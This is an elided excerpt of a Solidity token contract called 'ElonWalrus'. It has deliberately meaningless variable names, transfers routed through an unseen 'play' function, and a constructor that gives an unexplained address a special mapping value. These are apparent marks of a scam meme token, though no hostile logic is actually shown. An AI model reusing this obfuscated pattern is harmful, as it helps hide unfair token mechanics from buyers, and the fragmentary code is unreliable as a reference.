...
contract ElonWalrus is Ownable {
    ...
    string private football;
    uint256 private reason;
    uint8 private value;
    ...
    mapping(address => uint256) private shinning;
    ...
    mapping(address => uint256) private figure;
    ...
    function transferFrom(
        ...
        play(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        play(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        house = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        reason = 100;
        figure[heart] = value;
        _tTotal = 1000000000000000 * 10**value;
        shinning[msg.sender] = _tTotal;
    }
}